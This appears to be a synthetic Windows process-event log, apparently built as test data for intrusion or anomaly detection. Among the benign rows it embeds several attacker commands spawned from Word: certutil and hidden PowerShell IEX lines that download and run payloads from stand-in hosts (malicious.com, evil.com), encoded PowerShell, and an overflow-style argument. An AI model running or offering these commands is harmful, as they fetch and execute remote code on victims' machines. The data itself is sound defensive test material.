+2026-03-30 18:17:08,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
+2026-03-30 18:17:09,notepad.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
+2026-03-30 18:17:10,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.81,0,chrome
+2026-03-30 18:17:11,explorer.exe,explorer.exe,explorer open folder,192.168.1.103,0,chrome
+2026-03-30 18:17:12,cmd.exe,explorer.exe,notepad file.txt,192.168.1.61,0,chrome
+2026-03-30 18:17:13,cmd.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
+2026-03-30 18:17:14,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.188,0,chrome
+2026-03-30 18:17:15,notepad.exe,explorer.exe,explorer open folder,192.168.1.173,0,chrome
+2026-03-30 18:17:16,cmd.exe,explorer.exe,cmd dir,192.168.1.245,0,chrome
+2026-03-30 18:17:17,explorer.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
+2026-03-30 18:17:18,explorer.exe,explorer.exe,cmd dir,192.168.1.7,0,chrome
+2026-03-30 18:17:19,notepad.exe,explorer.exe,cmd dir,192.168.1.40,0,chrome
+2026-03-30 18:17:20,chrome.exe,explorer.exe,cmd dir,192.168.1.56,0,chrome
+2026-03-30 18:17:21,cmd.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
+2026-03-30 18:17:22,explorer.exe,explorer.exe,cmd dir,192.168.1.120,0,chrome
+2026-03-30 18:17:23,cmd.exe,explorer.exe,cmd dir,192.168.1.39,0,chrome
+2026-03-30 18:17:24,cmd.exe,explorer.exe,explorer open folder,192.168.1.130,0,chrome
+2026-03-30 18:17:25,explorer.exe,explorer.exe,explorer open folder,192.168.1.120,0,chrome
+2026-03-30 18:17:26,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.149,0,chrome
+2026-03-30 18:17:27,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.112,0,chrome
+2026-03-30 18:17:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.205,0,chrome
+2026-03-30 18:17:29,notepad.exe,explorer.exe,explorer open folder,192.168.1.94,0,chrome
+2026-03-30 18:17:30,explorer.exe,explorer.exe,notepad file.txt,192.168.1.206,0,chrome
+2026-03-30 18:17:31,cmd.exe,explorer.exe,notepad file.txt,192.168.1.26,0,chrome
+2026-03-30 18:17:32,notepad.exe,explorer.exe,explorer open folder,192.168.1.63,0,chrome
+2026-03-30 18:17:33,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.7,0,chrome
+2026-03-30 18:17:34,chrome.exe,explorer.exe,notepad file.txt,192.168.1.98,0,chrome
+2026-03-30 18:17:35,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
+2026-03-30 18:17:36,notepad.exe,explorer.exe,explorer open folder,192.168.1.228,0,chrome
+2026-03-30 18:17:37,cmd.exe,explorer.exe,notepad file.txt,192.168.1.90,0,chrome
+2026-03-30 18:17:38,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.193,0,chrome
+2026-03-30 18:17:39,explorer.exe,explorer.exe,explorer open folder,192.168.1.182,0,chrome
+2026-03-30 18:17:40,cmd.exe,explorer.exe,notepad file.txt,192.168.1.13,0,chrome
+2026-03-30 18:17:41,explorer.exe,explorer.exe,cmd dir,192.168.1.75,0,chrome
+2026-03-30 18:17:42,cmd.exe,explorer.exe,cmd dir,192.168.1.139,0,chrome
+2026-03-30 18:17:43,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.8,0,chrome
+2026-03-30 18:17:44,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.195,0,chrome
+2026-03-30 18:17:45,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,443,curl
+2026-03-30 18:17:46,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),45.33.32.156,80,curl
+2026-03-30 18:17:47,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,80,python-requests
+2026-03-30 18:17:48,powershell.exe,winword.exe,cmd /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1'),8.8.8.8,443,python-requests
+2026-03-30 18:17:49,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,443,python-requests
+2026-03-30 18:17:50,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:17:51,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:17:52,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:17:53,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
+2026-03-30 18:17:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
+2026-03-30 18:17:55,explorer.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
+2026-03-30 18:17:56,notepad.exe,explorer.exe,explorer open folder,192.168.1.93,0,chrome
+2026-03-30 18:17:57,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.231,0,chrome
+2026-03-30 18:17:58,explorer.exe,explorer.exe,explorer open folder,192.168.1.54,0,chrome
+2026-03-30 18:17:59,chrome.exe,explorer.exe,cmd dir,192.168.1.171,0,chrome
+2026-03-30 18:18:00,explorer.exe,explorer.exe,notepad file.txt,192.168.1.220,0,chrome
+2026-03-30 18:18:01,cmd.exe,explorer.exe,cmd dir,192.168.1.27,0,chrome
+2026-03-30 18:18:02,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.168,0,chrome
+2026-03-30 18:18:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.126,0,chrome
+2026-03-30 18:18:04,explorer.exe,explorer.exe,cmd dir,192.168.1.162,0,chrome
+2026-03-30 18:18:05,chrome.exe,explorer.exe,cmd dir,192.168.1.200,0,chrome
+2026-03-30 18:18:06,chrome.exe,explorer.exe,cmd dir,192.168.1.216,0,chrome
+2026-03-30 18:18:07,chrome.exe,explorer.exe,cmd dir,192.168.1.222,0,chrome
+2026-03-30 18:18:08,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.141,0,chrome
+2026-03-30 18:18:09,explorer.exe,explorer.exe,cmd dir,192.168.1.71,0,chrome
+2026-03-30 18:18:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.213,0,chrome
+2026-03-30 18:18:11,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
+2026-03-30 18:18:12,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.12,0,chrome
+2026-03-30 18:18:13,notepad.exe,explorer.exe,notepad file.txt,192.168.1.82,0,chrome
+2026-03-30 18:18:14,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.62,0,chrome
+2026-03-30 18:18:15,chrome.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
+2026-03-30 18:18:16,notepad.exe,explorer.exe,notepad file.txt,192.168.1.214,0,chrome
+2026-03-30 18:18:17,chrome.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
+2026-03-30 18:18:18,cmd.exe,explorer.exe,explorer open folder,192.168.1.63,0,chrome
+2026-03-30 18:18:19,notepad.exe,explorer.exe,notepad file.txt,192.168.1.72,0,chrome
+2026-03-30 18:18:20,cmd.exe,explorer.exe,notepad file.txt,192.168.1.252,0,chrome
+2026-03-30 18:18:21,chrome.exe,explorer.exe,explorer open folder,192.168.1.91,0,chrome
+2026-03-30 18:18:22,explorer.exe,explorer.exe,notepad file.txt,192.168.1.69,0,chrome
+2026-03-30 18:18:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.248,0,chrome
+2026-03-30 18:18:24,notepad.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
+2026-03-30 18:18:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.120,0,chrome
+2026-03-30 18:18:26,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.154,0,chrome
+2026-03-30 18:18:27,notepad.exe,explorer.exe,explorer open folder,192.168.1.111,0,chrome
+2026-03-30 18:18:28,explorer.exe,explorer.exe,notepad file.txt,192.168.1.67,0,chrome
+2026-03-30 18:18:29,notepad.exe,explorer.exe,cmd dir,192.168.1.2,0,chrome
+2026-03-30 18:18:30,cmd.exe,explorer.exe,notepad file.txt,192.168.1.57,0,chrome
+2026-03-30 18:18:31,cmd.exe,explorer.exe,explorer open folder,192.168.1.240,0,chrome
+2026-03-30 18:18:32,notepad.exe,explorer.exe,notepad file.txt,192.168.1.128,0,chrome
+2026-03-30 18:18:33,cmd.exe,explorer.exe,cmd dir,192.168.1.193,0,chrome
+2026-03-30 18:18:34,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.184,0,chrome
+2026-03-30 18:18:35,chrome.exe,explorer.exe,cmd dir,192.168.1.98,0,chrome
+2026-03-30 18:18:36,explorer.exe,explorer.exe,explorer open folder,192.168.1.195,0,chrome
+2026-03-30 18:18:37,cmd.exe,explorer.exe,explorer open folder,192.168.1.152,0,chrome
+2026-03-30 18:18:38,chrome.exe,explorer.exe,explorer open folder,192.168.1.36,0,chrome
+2026-03-30 18:18:39,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.83,0,chrome
+2026-03-30 18:18:40,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.201,0,chrome
+2026-03-30 18:18:41,chrome.exe,explorer.exe,notepad file.txt,192.168.1.37,0,chrome
+2026-03-30 18:18:42,explorer.exe,explorer.exe,explorer open folder,192.168.1.235,0,chrome
+2026-03-30 18:18:43,notepad.exe,explorer.exe,notepad file.txt,192.168.1.70,0,chrome
+2026-03-30 18:18:44,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.45,0,chrome
+2026-03-30 18:18:45,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
+2026-03-30 18:18:46,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
+2026-03-30 18:18:47,notepad.exe,explorer.exe,cmd dir,192.168.1.213,0,chrome
+2026-03-30 18:18:48,explorer.exe,explorer.exe,explorer open folder,192.168.1.142,0,chrome
+2026-03-30 18:18:49,explorer.exe,explorer.exe,cmd dir,192.168.1.11,0,chrome
+2026-03-30 18:18:50,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.232,0,chrome
+2026-03-30 18:18:51,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
+2026-03-30 18:18:52,explorer.exe,explorer.exe,explorer open folder,192.168.1.145,0,chrome
+2026-03-30 18:18:53,chrome.exe,explorer.exe,explorer open folder,192.168.1.77,0,chrome
+2026-03-30 18:18:54,chrome.exe,explorer.exe,cmd dir,192.168.1.217,0,chrome
+2026-03-30 18:18:55,chrome.exe,explorer.exe,cmd dir,192.168.1.244,0,chrome
+2026-03-30 18:18:56,cmd.exe,explorer.exe,notepad file.txt,192.168.1.108,0,chrome
+2026-03-30 18:18:57,explorer.exe,explorer.exe,explorer open folder,192.168.1.248,0,chrome
+2026-03-30 18:18:58,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.80,0,chrome
+2026-03-30 18:18:59,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.39,0,chrome
+2026-03-30 18:19:00,chrome.exe,explorer.exe,cmd dir,192.168.1.123,0,chrome
+2026-03-30 18:19:01,chrome.exe,explorer.exe,notepad file.txt,192.168.1.77,0,chrome
+2026-03-30 18:19:02,cmd.exe,explorer.exe,notepad file.txt,192.168.1.54,0,chrome
+2026-03-30 18:19:03,cmd.exe,explorer.exe,cmd dir,192.168.1.232,0,chrome
+2026-03-30 18:19:04,cmd.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
+2026-03-30 18:19:05,cmd.exe,explorer.exe,explorer open folder,192.168.1.117,0,chrome
+2026-03-30 18:19:06,cmd.exe,explorer.exe,explorer open folder,192.168.1.141,0,chrome
+2026-03-30 18:19:07,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.178,0,chrome
+2026-03-30 18:19:08,explorer.exe,explorer.exe,explorer open folder,192.168.1.125,0,chrome
+2026-03-30 18:19:09,chrome.exe,explorer.exe,explorer open folder,192.168.1.49,0,chrome
+2026-03-30 18:19:10,cmd.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
+2026-03-30 18:19:11,explorer.exe,explorer.exe,notepad file.txt,192.168.1.214,0,chrome
+2026-03-30 18:19:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.70,0,chrome
+2026-03-30 18:19:13,cmd.exe,explorer.exe,notepad file.txt,192.168.1.243,0,chrome
+2026-03-30 18:19:14,explorer.exe,explorer.exe,cmd dir,192.168.1.101,0,chrome
+2026-03-30 18:19:15,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.236,0,chrome
+2026-03-30 18:19:16,chrome.exe,explorer.exe,cmd dir,192.168.1.147,0,chrome
+2026-03-30 18:19:17,cmd.exe,explorer.exe,notepad file.txt,192.168.1.157,0,chrome
+2026-03-30 18:19:18,notepad.exe,explorer.exe,cmd dir,192.168.1.235,0,chrome
+2026-03-30 18:19:19,cmd.exe,explorer.exe,notepad file.txt,192.168.1.18,0,chrome
+2026-03-30 18:19:20,chrome.exe,explorer.exe,cmd dir,192.168.1.8,0,chrome
+2026-03-30 18:19:21,cmd.exe,explorer.exe,notepad file.txt,192.168.1.191,0,chrome
+2026-03-30 18:19:22,cmd.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
+2026-03-30 18:19:23,cmd.exe,explorer.exe,notepad file.txt,192.168.1.143,0,chrome
+2026-03-30 18:19:24,cmd.exe,explorer.exe,notepad file.txt,192.168.1.72,0,chrome
+2026-03-30 18:19:25,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,curl
+2026-03-30 18:19:26,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
+2026-03-30 18:19:27,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,1.1.1.1,4444,curl
+2026-03-30 18:19:28,powershell.exe,winword.exe,powershell -enc aW52b2tl,23.45.67.89,443,python-requests
+2026-03-30 18:19:29,powershell.exe,winword.exe,powershell -enc aW52b2tl,8.8.8.8,443,curl
+2026-03-30 18:19:30,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:19:31,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:19:32,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:19:33,chrome.exe,explorer.exe,explorer open folder,192.168.1.135,0,chrome
+2026-03-30 18:19:34,notepad.exe,explorer.exe,explorer open folder,192.168.1.6,0,chrome
+2026-03-30 18:19:35,explorer.exe,explorer.exe,notepad file.txt,192.168.1.140,0,chrome
+2026-03-30 18:19:36,notepad.exe,explorer.exe,notepad file.txt,192.168.1.68,0,chrome
+2026-03-30 18:19:37,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.79,0,chrome
+2026-03-30 18:19:38,cmd.exe,explorer.exe,notepad file.txt,192.168.1.229,0,chrome
+2026-03-30 18:19:39,cmd.exe,explorer.exe,explorer open folder,192.168.1.252,0,chrome
+2026-03-30 18:19:40,chrome.exe,explorer.exe,cmd dir,192.168.1.212,0,chrome
+2026-03-30 18:19:41,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.61,0,chrome
+2026-03-30 18:19:42,chrome.exe,explorer.exe,explorer open folder,192.168.1.86,0,chrome
+2026-03-30 18:19:43,chrome.exe,explorer.exe,cmd dir,192.168.1.42,0,chrome
+2026-03-30 18:19:44,cmd.exe,explorer.exe,cmd dir,192.168.1.204,0,chrome
+2026-03-30 18:19:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,45.33.32.156,8080,curl
+2026-03-30 18:19:46,explorer.exe,explorer.exe,explorer open folder,192.168.1.8,0,chrome
+2026-03-30 18:19:47,chrome.exe,explorer.exe,notepad file.txt,192.168.1.93,0,chrome
+2026-03-30 18:19:48,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.229,0,chrome
+2026-03-30 18:19:49,explorer.exe,explorer.exe,notepad file.txt,192.168.1.66,0,chrome
+2026-03-30 18:19:50,chrome.exe,explorer.exe,explorer open folder,192.168.1.243,0,chrome
+2026-03-30 18:19:51,chrome.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
+2026-03-30 18:19:52,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.100,0,chrome
+2026-03-30 18:19:53,explorer.exe,explorer.exe,explorer open folder,192.168.1.160,0,chrome
+2026-03-30 18:19:54,notepad.exe,explorer.exe,notepad file.txt,192.168.1.255,0,chrome
+2026-03-30 18:19:55,chrome.exe,explorer.exe,notepad file.txt,192.168.1.160,0,chrome
+2026-03-30 18:19:56,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
+2026-03-30 18:19:57,explorer.exe,explorer.exe,notepad file.txt,192.168.1.119,0,chrome
+2026-03-30 18:19:58,chrome.exe,explorer.exe,notepad file.txt,192.168.1.90,0,chrome
+2026-03-30 18:19:59,explorer.exe,explorer.exe,explorer open folder,192.168.1.171,0,chrome
+2026-03-30 18:20:00,explorer.exe,explorer.exe,explorer open folder,192.168.1.131,0,chrome
+2026-03-30 18:20:01,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.203,0,chrome
+2026-03-30 18:20:02,chrome.exe,explorer.exe,explorer open folder,192.168.1.179,0,chrome
+2026-03-30 18:20:03,cmd.exe,explorer.exe,explorer open folder,192.168.1.246,0,chrome
+2026-03-30 18:20:04,cmd.exe,explorer.exe,cmd dir,192.168.1.141,0,chrome
+2026-03-30 18:20:05,chrome.exe,explorer.exe,explorer open folder,192.168.1.154,0,chrome
+2026-03-30 18:20:06,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.158,0,chrome
+2026-03-30 18:20:07,explorer.exe,explorer.exe,notepad file.txt,192.168.1.193,0,chrome
+2026-03-30 18:20:08,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.175,0,chrome
+2026-03-30 18:20:09,cmd.exe,explorer.exe,explorer open folder,192.168.1.117,0,chrome
+2026-03-30 18:20:10,cmd.exe,explorer.exe,notepad file.txt,192.168.1.197,0,chrome
+2026-03-30 18:20:11,chrome.exe,explorer.exe,cmd dir,192.168.1.26,0,chrome
+2026-03-30 18:20:12,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.28,0,chrome
+2026-03-30 18:20:13,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.191,0,chrome
+2026-03-30 18:20:14,chrome.exe,explorer.exe,notepad file.txt,192.168.1.28,0,chrome
+2026-03-30 18:20:15,unknown_375.exe,winword.exe,random suspicious execution,8.8.8.8,9999,unknown
+2026-03-30 18:20:16,notepad.exe,explorer.exe,explorer open folder,192.168.1.202,0,chrome
+2026-03-30 18:20:17,notepad.exe,explorer.exe,notepad file.txt,192.168.1.251,0,chrome
+2026-03-30 18:20:18,explorer.exe,explorer.exe,cmd dir,192.168.1.225,0,chrome
+2026-03-30 18:20:19,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.75,0,chrome
+2026-03-30 18:20:20,explorer.exe,explorer.exe,notepad file.txt,192.168.1.184,0,chrome
+2026-03-30 18:20:21,explorer.exe,explorer.exe,notepad file.txt,192.168.1.121,0,chrome
+2026-03-30 18:20:22,explorer.exe,explorer.exe,cmd dir,192.168.1.6,0,chrome
+2026-03-30 18:20:23,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.205,0,chrome
+2026-03-30 18:20:24,explorer.exe,explorer.exe,explorer open folder,192.168.1.68,0,chrome
+2026-03-30 18:20:25,cmd.exe,explorer.exe,explorer open folder,192.168.1.17,0,chrome
+2026-03-30 18:20:26,chrome.exe,explorer.exe,explorer open folder,192.168.1.202,0,chrome
+2026-03-30 18:20:27,explorer.exe,explorer.exe,cmd dir,192.168.1.132,0,chrome
+2026-03-30 18:20:28,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.9,0,chrome
+2026-03-30 18:20:29,chrome.exe,explorer.exe,cmd dir,192.168.1.182,0,chrome
+2026-03-30 18:20:30,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.207,0,chrome
+2026-03-30 18:20:31,cmd.exe,explorer.exe,explorer open folder,192.168.1.60,0,chrome
+2026-03-30 18:20:32,cmd.exe,explorer.exe,cmd dir,192.168.1.110,0,chrome
+2026-03-30 18:20:33,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.180,0,chrome
+2026-03-30 18:20:34,cmd.exe,explorer.exe,explorer open folder,192.168.1.124,0,chrome
+2026-03-30 18:20:35,cmd.exe,explorer.exe,cmd dir,192.168.1.197,0,chrome
+2026-03-30 18:20:36,cmd.exe,explorer.exe,explorer open folder,192.168.1.139,0,chrome
+2026-03-30 18:20:37,cmd.exe,explorer.exe,explorer open folder,192.168.1.224,0,chrome
+2026-03-30 18:20:38,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.242,0,chrome
+2026-03-30 18:20:39,notepad.exe,explorer.exe,cmd dir,192.168.1.125,0,chrome
+2026-03-30 18:20:40,cmd.exe,explorer.exe,explorer open folder,192.168.1.15,0,chrome
+2026-03-30 18:20:41,cmd.exe,explorer.exe,cmd dir,192.168.1.237,0,chrome
+2026-03-30 18:20:42,notepad.exe,explorer.exe,explorer open folder,192.168.1.159,0,chrome
+2026-03-30 18:20:43,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.193,0,chrome
+2026-03-30 18:20:44,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
+2026-03-30 18:20:45,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.235,0,chrome
+2026-03-30 18:20:46,chrome.exe,explorer.exe,explorer open folder,192.168.1.216,0,chrome
+2026-03-30 18:20:47,cmd.exe,explorer.exe,cmd dir,192.168.1.31,0,chrome
+2026-03-30 18:20:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.5,0,chrome
+2026-03-30 18:20:49,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.92,0,chrome
+2026-03-30 18:20:50,explorer.exe,explorer.exe,notepad file.txt,192.168.1.15,0,chrome
+2026-03-30 18:20:51,notepad.exe,explorer.exe,notepad file.txt,192.168.1.191,0,chrome
+2026-03-30 18:20:52,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.134,0,chrome
+2026-03-30 18:20:53,chrome.exe,explorer.exe,notepad file.txt,192.168.1.202,0,chrome
+2026-03-30 18:20:54,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.74,0,chrome
+2026-03-30 18:20:55,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.146,0,chrome
+2026-03-30 18:20:56,explorer.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
+2026-03-30 18:20:57,notepad.exe,explorer.exe,cmd dir,192.168.1.165,0,chrome
+2026-03-30 18:20:58,notepad.exe,explorer.exe,cmd dir,192.168.1.169,0,chrome
+2026-03-30 18:20:59,explorer.exe,explorer.exe,explorer open folder,192.168.1.131,0,chrome
+2026-03-30 18:21:00,cmd.exe,explorer.exe,notepad file.txt,192.168.1.219,0,chrome
+2026-03-30 18:21:01,cmd.exe,explorer.exe,explorer open folder,192.168.1.186,0,chrome
+2026-03-30 18:21:02,explorer.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
+2026-03-30 18:21:03,chrome.exe,explorer.exe,cmd dir,192.168.1.5,0,chrome
+2026-03-30 18:21:04,chrome.exe,explorer.exe,cmd dir,192.168.1.72,0,chrome
+2026-03-30 18:21:05,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,4444,python-requests
+2026-03-30 18:21:06,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,8.8.8.8,80,curl
+2026-03-30 18:21:07,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,443,curl
+2026-03-30 18:21:08,powershell.exe,winword.exe,powershell -enc Y3VybCAtVVJM,23.45.67.89,80,python-requests
+2026-03-30 18:21:09,powershell.exe,winword.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,1.1.1.1,80,python-requests
+2026-03-30 18:21:10,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,23.45.67.89,80,winhttp
+2026-03-30 18:21:11,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,8.8.8.8,80,winhttp
+2026-03-30 18:21:12,certutil.exe,cmd.exe,certutil -urlcache -split -f http://malicious.com/payload.exe payload.exe,45.33.32.156,80,winhttp
+2026-03-30 18:21:13,chrome.exe,explorer.exe,cmd dir,192.168.1.234,0,chrome
+2026-03-30 18:21:14,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.94,0,chrome
+2026-03-30 18:21:15,cmd.exe,explorer.exe,chrome browsing google.com,192.168.1.212,0,chrome
+2026-03-30 18:21:16,cmd.exe,explorer.exe,cmd dir,192.168.1.191,0,chrome
+2026-03-30 18:21:17,cmd.exe,explorer.exe,cmd dir,192.168.1.156,0,chrome
+2026-03-30 18:21:18,notepad.exe,explorer.exe,cmd dir,192.168.1.90,0,chrome
+2026-03-30 18:21:19,cmd.exe,explorer.exe,cmd dir,192.168.1.112,0,chrome
+2026-03-30 18:21:20,explorer.exe,explorer.exe,explorer open folder,192.168.1.149,0,chrome
+2026-03-30 18:21:21,explorer.exe,explorer.exe,chrome browsing google.com,192.168.1.198,0,chrome
+2026-03-30 18:21:22,notepad.exe,explorer.exe,notepad file.txt,192.168.1.142,0,chrome
+2026-03-30 18:21:23,explorer.exe,explorer.exe,notepad file.txt,192.168.1.16,0,chrome
+2026-03-30 18:21:24,explorer.exe,explorer.exe,cmd dir,192.168.1.25,0,chrome
+2026-03-30 18:21:25,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.251,0,chrome
+2026-03-30 18:21:26,cmd.exe,explorer.exe,notepad file.txt,192.168.1.131,0,chrome
+2026-03-30 18:21:27,cmd.exe,explorer.exe,cmd dir,192.168.1.79,0,chrome
+2026-03-30 18:21:28,cmd.exe,explorer.exe,cmd dir,192.168.1.176,0,chrome
+2026-03-30 18:21:29,chrome.exe,explorer.exe,notepad file.txt,192.168.1.154,0,chrome
+2026-03-30 18:21:30,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.35,0,chrome
+2026-03-30 18:21:31,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.158,0,chrome
+2026-03-30 18:21:32,cmd.exe,explorer.exe,explorer open folder,192.168.1.205,0,chrome
+2026-03-30 18:21:33,explorer.exe,explorer.exe,cmd dir,192.168.1.99,0,chrome
+2026-03-30 18:21:34,notepad.exe,explorer.exe,notepad file.txt,192.168.1.149,0,chrome
+2026-03-30 18:21:35,cmd.exe,explorer.exe,cmd dir,192.168.1.165,0,chrome
+2026-03-30 18:21:36,notepad.exe,explorer.exe,explorer open folder,192.168.1.153,0,chrome
+2026-03-30 18:21:37,chrome.exe,explorer.exe,chrome browsing google.com,192.168.1.219,0,chrome
+2026-03-30 18:21:38,notepad.exe,explorer.exe,explorer open folder,192.168.1.145,0,chrome
+2026-03-30 18:21:39,cmd.exe,explorer.exe,notepad file.txt,192.168.1.226,0,chrome
+2026-03-30 18:21:40,cmd.exe,explorer.exe,explorer open folder,192.168.1.67,0,chrome
+2026-03-30 18:21:41,explorer.exe,explorer.exe,notepad file.txt,192.168.1.218,0,chrome
+2026-03-30 18:21:42,cmd.exe,explorer.exe,notepad file.txt,192.168.1.225,0,chrome
+2026-03-30 18:21:43,explorer.exe,explorer.exe,cmd dir,192.168.1.168,0,chrome
+2026-03-30 18:21:44,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.130,0,chrome
+2026-03-30 18:21:45,weird.exe,cmd.exe,weird.exe AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,23.45.67.89,8080,curl
+2026-03-30 18:21:46,chrome.exe,explorer.exe,notepad file.txt,192.168.1.230,0,chrome
+2026-03-30 18:21:47,notepad.exe,explorer.exe,notepad file.txt,192.168.1.167,0,chrome
+2026-03-30 18:21:48,notepad.exe,explorer.exe,chrome browsing google.com,192.168.1.43,0,chrome
+2026-03-30 18:21:49,notepad.exe,explorer.exe,cmd dir,192.168.1.211,0,chrome
